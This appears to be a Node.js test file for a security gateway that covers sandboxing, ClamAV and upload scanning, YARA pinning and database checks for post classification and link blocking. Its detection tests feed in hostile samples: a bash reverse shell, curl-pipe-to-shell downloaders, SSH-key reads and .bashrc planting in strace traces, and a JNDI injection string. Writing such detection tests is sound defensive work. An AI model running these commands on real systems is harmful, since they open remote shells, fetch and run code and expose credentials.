// 088, the Wall's operations (Aaron, Nov 26, with 3213: "execute the attached" plan, Phase 0 and Phase 1). The pure parts
// run everywhere; the database parts need TEST_DATABASE_URL (required in CI):
//   WO1 sandbox: what strace shows is read into W47 / W47b, and only runnable files are run;
//   WO2 ClamAV: its answers become W46, and an engine that can't run gives W46b for every file;
//   WO3 uploads: files in a multipart body are scanned; text fields are checked, file bytes are not read as text;
//   WO4 the facts gather: ClamAV and the sandbox's findings join each file's scan; foreign or forged findings are dropped;
//   WO5 the YARA pin: the wiki pins a release by tag and SHA-256; a download that doesn't match is a broken pack;
//   WO6-WO10 the database: pay-as-you-go, the classifier, the wiki's health alerts, click-time links, rescans.
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const sandbox = require('../wall/sandbox');
const clamav = require('../wall/clamav');
const upload = require('../wall/upload');
const fw = require('../wall/firewall');
const workjobs = require('../db/workjobs');
const sync = require('../wiki/sync');

const PE = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(58), Buffer.from([0x40, 0, 0, 0]), Buffer.from('PE\0\0'), Buffer.alloc(200)]);
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(300)]);
const EICAR = Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*');

test('WO1 the sandbox reads behaviour, not names: network, shells, downloaders and planting block; secrets and many processes flag', () => {
  const t = [
    '100 execve("/usr/bin/node", ["node", "/tmp/w/f.js"], 0x0) = 0',
    '101 execve("/bin/sh", ["sh", "-c", "curl x|sh"], 0x0) = 0',
    '102 execve("/usr/bin/curl", ["curl", "x"], 0x0) = 0',
    '102 connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.5")}, 16) = -1 ENETUNREACH',
    '103 openat(AT_FDCWD, "/home/x/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3',
    '104 openat(AT_FDCWD, "/home/x/.ssh/id_rsa", O_RDONLY) = -1 ENOENT'
  ].join('\n');
  const f = sandbox.analyze(t, 'evil.js').map((x) => x.split(':')[0] + ':' + x.split(':')[1]);
  assert.deepStrictEqual(f, ['W47 sandbox: started a shell (sh)', 'W47 sandbox: started curl', 'W47 sandbox: tried to reach the network', 'W47 sandbox: tried to plant itself (/home/x/.bashrc)', 'W47b sandbox: read a place secrets are kept (/home/x/.ssh/id_rsa)']);
  // The program's own first start is not "a shell"; a Unix socket is not the network.
  assert.deepStrictEqual(sandbox.analyze('1 execve("/bin/bash", ["bash", "f.sh"], 0x0) = 0\n1 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1', 'ok.sh'), []);
  for (const [name, bytes, want] of [['a.sh', 'echo', 'bash'], ['a.py', 'x', 'python3'], ['run', '#!/usr/bin/env python3\n', 'python3'], ['bin', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2]), 'elf'],
    ['readme.md', '# hi', null], ['logo.png', PNG, null], ['tool', '#!/bin/sh\n', 'sh']]) {
    const r = sandbox.runnerFor(name, Buffer.from(bytes));
    assert.strictEqual(r ? r[0] : null, want, name);
  }
});

test('WO1b the sandbox for real, where bubblewrap and strace are installed: hostile scripts are caught by what they do, honest ones pass', { skip: !sandbox.available() && 'bubblewrap or strace not installed here' }, () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wo1-'));
  const run = (n, c) => sandbox.runOne(dir, n, Buffer.from(c)).map((x) => x.split(' ')[0]);
  assert.ok(run('rev.sh', 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n').includes('W47'));
  assert.ok(run('dl.js', "require('child_process').execSync('curl -s http://e.example/x | sh')").includes('W47'));
  assert.ok(run('net.py', 'import socket; socket.create_connection(("203.0.113.9", 80), 2)').includes('W47'));
  assert.deepStrictEqual(run('ok.js', 'console.log([1, 2, 3].map((x) => x * 2).join(","))'), []);
  assert.deepStrictEqual(run('ok.py', 'print(sum(range(10)))'), []);
});

test('WO2 ClamAV: its findings are W46 by file; an engine that can\'t run flags every file W46b (never a silent pass)', () => {
  const none = clamav.scan([{ key: 'a', name: 'a.bin', bytes: Buffer.from('x') }, { key: 'b', name: 'b.bin', bytes: Buffer.from('y') }], { bin: 'no-such-clamscan-088' });
  assert.deepStrictEqual([...none.values()].map((v) => v[0].split(' ')[0]), ['W46b', 'W46b']);
  const have = spawnSync('clamscan', ['--version'], { encoding: 'utf8' }).status === 0;
  if (!have) return;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wo2-'));
  const sample = Buffer.from('wall-088-antivirus-sample\n');
  fs.writeFileSync(path.join(dir, 'test.hdb'), crypto.createHash('md5').update(sample).digest('hex') + ':' + sample.length + ':Wall.Test.Sample-088\n');
  const got = clamav.scan([{ key: 'bad', name: 'bad.bin', bytes: sample }, { key: 'ok', name: 'ok.txt', bytes: Buffer.from('hello') }], { db: path.join(dir, 'test.hdb') });
  assert.deepStrictEqual([...got.keys()], ['bad']);
  assert.match(got.get('bad')[0], /^W46 antivirus: ClamAV found Wall\.Test\.Sample-088/);
});

const mp = (name, bytes, note = 'hello') => {
  const b = '----wo3';
  return { ct: 'multipart/form-data; boundary=' + b, body: Buffer.concat([Buffer.from('--' + b + '\r\nContent-Disposition: form-data; name="note"\r\n\r\n' + note + '\r\n--' + b
    + '\r\nContent-Disposition: form-data; name="f"; filename="' + name + '"\r\nContent-Type: application/octet-stream\r\n\r\n'), bytes, Buffer.from('\r\n--' + b + '--\r\n')]) };
};
test('WO3 uploads: a program (named anything), a disguised file or the EICAR file in a multipart body is refused; an image passes; the text fields are still checked', () => {
  const d = (m) => fw.decide({ path: '/api/x', method: 'POST', ua: 'Mozilla/5.0', ip: '8.8.8.8', headers: {}, bodyBytes: m.body, contentType: m.ct, body: m.body.toString('utf8') }, { since: '2026-01-01' });
  for (const [n, b, rule] of [['photo.png', PE, 'W39'], ['setup.exe', PE, 'W39'], ['eicar.txt', EICAR, 'W42']]) { const r = d(mp(n, b)); assert.deepStrictEqual([r.action, r.rule], ['block', rule], n); }
  assert.strictEqual(d(mp('logo.png', PNG)).action, 'allow', 'an image\'s bytes are not read as text');
  assert.strictEqual(d(mp('logo.png', PNG, '${jndi:ldap://e.example/a}')).action, 'block', 'the form\'s text fields still are');
  assert.deepStrictEqual(upload.parts(mp('a.txt', Buffer.from('abc')).body, 'multipart/form-data; boundary=----wo3').map((p) => [p.filename, p.bytes.toString(), p.complete]), [['a.txt', 'abc', true]]);
});

test('WO4 the facts gather adds ClamAV\'s and the sandbox\'s findings to each file, and keeps only real W46/W47 findings', async () => {
  const get = async (p) => (p.startsWith('/pulls?') ? [] : p.startsWith('/pulls/7/files') ? [
    { filename: 'run.sh', status: 'added', changes: 1, patch: '@@\n+echo', contents_url: 'https://api.github.com/repos/MyChiefOS/start-of-something-great/contents/run.sh?ref=x' },
    { filename: 'a.txt', status: 'added', changes: 1, patch: '@@\n+hi', contents_url: 'https://api.github.com/repos/MyChiefOS/start-of-something-great/contents/a.txt?ref=x' }] : []);
  const getRaw = async (p) => Buffer.from(p.includes('run.sh') ? 'echo hi' : 'hi');
  const clam = (items) => new Map(items.filter((x) => x.name === 'a.txt').map((x) => [x.key, ['W46 antivirus: ClamAV found Test.Sig: a.txt']]));
  const sandboxFindings = { '7:run.sh': ['W47 sandbox: tried to reach the network: run.sh', 'W03 forged: run.sh', 'x'.repeat(300)], '8:run.sh': ['W47 sandbox: other PR'] };
  const facts = await workjobs.gather({ get, getRaw, wanted: [], files: [7], rules: null, clam, sandbox: sandboxFindings });
  const by = Object.fromEntries(facts.files[0].files.map((f) => [f.filename, f.scan.flags]));
  assert.deepStrictEqual(by['a.txt'], ['W46 antivirus: ClamAV found Test.Sig: a.txt']);
  assert.deepStrictEqual(by['run.sh'], ['W47 sandbox: tried to reach the network: run.sh'], 'only W47/W47b in the Wall\'s words, only for this pull request');
});

test('WO5 the YARA pin: the wiki reads the release and its digest from GitHub; the scanner refuses a pack that doesn\'t match it', async () => {
  const rel = { tag_name: '20261120', assets: [{ name: 'yara-forge-rules-core.zip', digest: 'sha256:' + 'a'.repeat(64) }] };
  const pin = await sync.yaraPin(async (u) => ({ status: u === sync.YARA_RELEASE ? 200 : 404, json: async () => rel }));
  assert.deepStrictEqual(pin, { tag: '20261120', sha256: 'a'.repeat(64) });
  assert.strictEqual(await sync.yaraPin(async () => ({ status: 403, json: async () => ({}) })), null, 'a refused read leaves the pin out');
  const asked = [];
  const r = await workjobs.forgeRules(pin, { fetchImpl: async (u) => { asked.push(u); return { ok: true, status: 200, arrayBuffer: async () => Buffer.from('not the pinned file') }; } });
  assert.deepStrictEqual(asked, ['https://github.com/YARAHQ/yara-forge/releases/download/20261120/yara-forge-rules-core.zip']);
  assert.match(r.broken, /digest does not match the wiki's pin 20261120/);
});

// ---- the database ----
const SERVER = process.env.TEST_DATABASE_URL;
if (!SERVER) {
  if (process.env.CI) test('the Wall operations tests need TEST_DATABASE_URL in CI', () => assert.fail('TEST_DATABASE_URL is not set'));
  else test('the Wall operations tests against a database', { skip: 'set TEST_DATABASE_URL to a Postgres server to run them' }, () => {});
  return;
}
const postgres = require('postgres');
const db = require('../db');
const { migrate } = require('../scripts/migrate');
const c = require('../signin/crypto');
const store = require('../db/signin');
const { promote, asSignin } = require('./helpers');
const NAME = 'dog_ops_' + crypto.randomBytes(4).toString('hex');
const WEB = NAME + '_web';
const PW = crypto.randomBytes(18).toString('base64url');
const at = (d, user, password) => { const u = new URL(SERVER); u.pathname = '/' + d; if (user) { u.username = user; u.password = password; } return u.toString(); };
let server, su, web, poster;
const q = (s, p) => su.unsafe(s, p);
const anon = (fn) => db.tx(web, { actor: 'anon' }, fn);
// A live post, as JEVs would have published it (its scoring is tested elsewhere): triggers off for the insert.
async function post(body) {
  await su.unsafe(`update app.jevs_settings set value = 'shadow' where key = 'mode'`);
  const [p] = await su.unsafe(`insert into app.posts (author_id, body, status) values ('${poster}', $b$${body}$b$, 'live') returning id`);
  await su.unsafe(`update app.jevs_settings set value = 'enforce' where key = 'mode'`);
  return p;
}
test.before(async () => {
  server = postgres(SERVER, { max: 1, ssl: false, onnotice: () => {} });
  await server.unsafe('create database ' + NAME);
  su = postgres(at(NAME), { max: 2, ssl: false, onnotice: () => {} });
  await migrate(su);
  await su.unsafe(`create role ${WEB} login noinherit password '${PW}'; grant dog_app to ${WEB}`);
  web = db.connect(at(NAME, WEB, PW), { ssl: false, max: 2 });
  const token = c.token(32);
  const out = await asSignin(su)((t) => store.signIn(t, { provider: 'github', fingerprints: [c.sha256hex('gh:ops')], keyVersion: 1, level: 1, displayName: 'Ops', sessionHash: c.sha256hex(token), sessionDays: 30 }));
  await promote(su, out.memberId);
  poster = out.memberId;
});
test.after(async () => {
  for (const x of [web, su]) if (x) await x.end({ timeout: 5 });
  if (server) { await server.unsafe(`drop database if exists ${NAME} with (force)`); await server.unsafe(`drop role if exists ${WEB}`); await server.end({ timeout: 5 }); }
});

test('WO6 pay-as-you-go (Aaron, Nov 26): no monthly cap, the four reviewers and the classifier on, each role\'s daily cap still the brake', async () => {
  assert.deepStrictEqual([...await q('select monthly_cap_cents from app.oversight_settings')], [{ monthly_cap_cents: null }]);
  const roles = Object.fromEntries((await q('select role, mode from app.oversight_roles')).map((r) => [r.role, r.mode]));
  for (const r of ['exploit_researcher', 'penetration_tester', 'quality_assurance', 'solution_architect', 'classifier']) assert.strictEqual(roles[r], 'on', r);
  assert.strictEqual(roles.fable_report, 'on', 'turned on by 089, the next PR');
  // With no submissions there is nothing to claim, but the claim runs (no cap refusal).
  assert.deepStrictEqual([...await anon((t) => t`select * from app.oversight_claim('exploit_researcher', 3)`)], []);
  // A daily cap of 0 stops the role.
  await q(`alter table app.oversight_roles disable row level security; update app.oversight_roles set daily_call_cap = 0 where role = 'classifier'; alter table app.oversight_roles enable row level security`);
  const p = await post('hello');
  assert.deepStrictEqual([...await anon((t) => t`select * from app.oversight_classify_claim(5)`)], [], 'the daily cap still holds');
  await q(`alter table app.oversight_roles disable row level security; update app.oversight_roles set daily_call_cap = 500 where role = 'classifier'; alter table app.oversight_roles enable row level security`);
  await su.unsafe(`delete from app.oversight_calls where post_id = '${p.id}'`);
});

test('WO7 the AI classifier reads each new post once; a concern goes to the review queue as W48, an ok changes nothing', async () => {
  const a = await post('Your account is locked: verify your password at http://x.test');
  const b = await post('Shipped the date fix today.');
  const got = await anon((t) => t`select * from app.oversight_classify_claim(5)`);
  const ids = got.map((x) => x.post_id);
  assert.ok(ids.includes(a.id) && ids.includes(b.id), 'both new posts are read (an earlier test\'s post may be too)');
  assert.ok(got.every((x) => x.model === 'anthropic/claude-haiku-5.5' && x.body.length > 0));
  assert.deepStrictEqual([...await anon((t) => t`select * from app.oversight_classify_claim(5)`)], [], 'each post is read once');
  await anon((t) => t`select app.oversight_classify_record(${a.id}::uuid, 'concern', 'Asks for a password on another site.', null)`);
  await anon((t) => t`select app.oversight_classify_record(${b.id}::uuid, 'ok', 'An update.', null)`);
  const flags = await q(`select post_id, source, classifier from app.review_flags where classifier = 'ai'`);
  assert.deepStrictEqual(flags.map((f) => [f.post_id, f.source]), [[a.id, 'classifier']], 'W48: the concern is in the review queue');
  const [why] = await q(`select verdict, reason from app.oversight_calls where post_id = '${a.id}'`);
  assert.deepStrictEqual([why.verdict, why.reason], ['concern', 'Asks for a password on another site.']);
  // Only the timer (anon or system) may run it: the same guard as 077's reviewers, which test/oversight.test.js checks with a stamped member.
  assert.match((await q(`select prosrc from pg_proc where proname = 'oversight_classify_claim'`))[0].prosrc, /app\.actor_kind\(\) <> all \(array\['anon', 'system'\]\)/);
});

test('WO8 the wiki\'s health: no good run in 24 hours, an empty feed, and a feed whose newest entry is old (Feodo) each raise one alert a day', async () => {
  const [v] = await q(`insert into app.wiki_versions (status, entries, packages, indicators, sources, created_at) values ('active', 1, 0, 1,
    '{"feodo": 0, "spamhaus": 900, "newest": {"feodo": "2026-03-04"}}', now() - interval '30 hours') returning id`);
  const [{ h }] = await anon((t) => t`select app.wiki_health_check() as h`);
  assert.deepStrictEqual(h.problems.map((p) => p.split(':')[0]).sort(), ['empty', 'old', 'stale']);
  assert.ok(h.problems.includes('old: feodo newest entry 2026-03-04'));
  await anon((t) => t`select app.wiki_health_check()`);
  const notes = await q(`select title from app.notices where member_id is null and kind = 'alert' and dedupe_key like 'wiki-health:%' order by title`);
  assert.strictEqual(notes.length, 3, 'once each, however often the timer asks');
  await q(`delete from app.wiki_versions where id = '${v.id}'`);
});

test('WO9 click-time links: a link on a blocking threat list is stopped, a score-only one warns, others go; only web links', async () => {
  await q(`update app.wiki_settings set last_run_at = now() - interval '13 hours', claim_hash = null, claim_until = null`);
  const [{ c: claim }] = await anon((t) => t`select app.wiki_claim() as c`);
  const payload = { entries: [], packages: [], indicators: [], sources: {}, indicator_groups: [{ kind: 'domain', source: 'certpl', values: ['bank-login-secure.test'] }, { kind: 'ip', source: 'cins', values: ['45.9.9.9'] }] };
  await db.tx(web, { actor: 'anon', timeout: 'wiki' }, (t) => t`select app.wiki_record(${claim}, ${JSON.stringify(payload)}::text::jsonb)`);
  const check = async (u) => (await anon((t) => t`select app.wall_link_check(${u}) as d`))[0].d.verdict;
  assert.strictEqual(await check('https://bank-login-secure.test/pay'), 'blocked');
  assert.strictEqual(await check('http://45.9.9.9/x'), 'warn');
  assert.strictEqual(await check('https://example.org/docs'), 'ok');
  assert.strictEqual(await check('javascript:alert(1)'), 'bad');
});

test('WO10 scan at submission: a pull request in review is read again 20 minutes after its last reading; one never read comes first', async () => {
  const [room] = await q(`select id from app.work_rooms where code = '15-0000'`);
  const [proj] = await q(`insert into app.work_projects (title, room_id, source, poster_member) values ('P', '${room.id}', 'member', '${poster}') returning id`);
  const sub = async (pr) => {
    const [t] = await q(`insert into app.work_tasks (project_id, room_id, title, description, class, size, source, poster_member) values ('${proj.id}', '${room.id}', 'T${pr}', '', 'either', 1, 'member', '${poster}') returning id`);
    const [cl] = await q(`insert into app.work_claims (task_id, member_id, code_hash, expires_at, status) values ('${t.id}', '${poster}', '${crypto.randomBytes(32).toString('hex')}', now() - interval '1 minute', 'expired') returning id`);
    await q(`insert into app.work_submissions (task_id, claim_id, worker_kind, worker_member, artifact_kind, artifact_url, pr_number, note, seal_key, seal, status)
      values ('${t.id}', '${cl.id}', 'member', '${poster}', 'pr', 'https://github.com/MyChiefOS/start-of-something-great/pull/${pr}', ${pr}, '', decode(repeat('ab', 32), 'hex'), '${crypto.randomBytes(32).toString('hex')}', 'waiting')`);
  };
  await sub(901); await sub(902);
  await q(`alter table app.tl_files disable trigger user`);
  await q(`insert into app.tl_files (number, files, read_at) values (901, '[]', now() - interval '25 minutes')`);
  await q(`alter table app.tl_files enable trigger user`);
  const wanted = async () => (await su.begin(async (t) => { await t.unsafe('set local role dog_ghsync'); return t.unsafe('select number from app.tl_files_wanted(5)'); })).map((r) => r.number);
  const w = await wanted();
  assert.ok(w.indexOf(902) !== -1 && w.indexOf(901) !== -1 && w.indexOf(902) < w.indexOf(901), JSON.stringify(w));
  await q(`update app.tl_files set read_at = now() where number = 901`);
  assert.ok(!(await wanted()).includes(901), 'not again within 20 minutes');
});
